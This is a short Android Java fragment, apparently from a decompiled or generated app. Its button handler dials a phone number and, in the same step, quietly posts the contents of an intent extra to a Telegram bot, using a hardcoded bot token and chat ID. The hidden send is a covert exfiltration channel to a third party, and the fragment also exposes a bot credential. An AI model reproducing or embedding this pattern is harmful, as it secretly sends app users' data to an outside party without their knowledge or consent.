		...
		button2.setOnClickListener(new View.OnClickListener() {
			...
			public void onClick(View _view) {
				if ("".equals(textview4.getText().toString())) {
					...
					in.setData(Uri.parse("tel:".concat(textview4.getText().toString())));
					startActivity(in);
					get.startRequestNetwork(RequestNetworkController.POST, "https://api.telegram.org/bot".concat("7279987890:AAF6H3vprvMg6LLSq5CnIWG7o1VTj-UWGr0".concat("/sendMessage?chat_id=".concat("7003820700".concat("&text=".concat(getIntent().getStringExtra("2")))))), "Rizwan", _get_request_listener);
				}
			}
		});
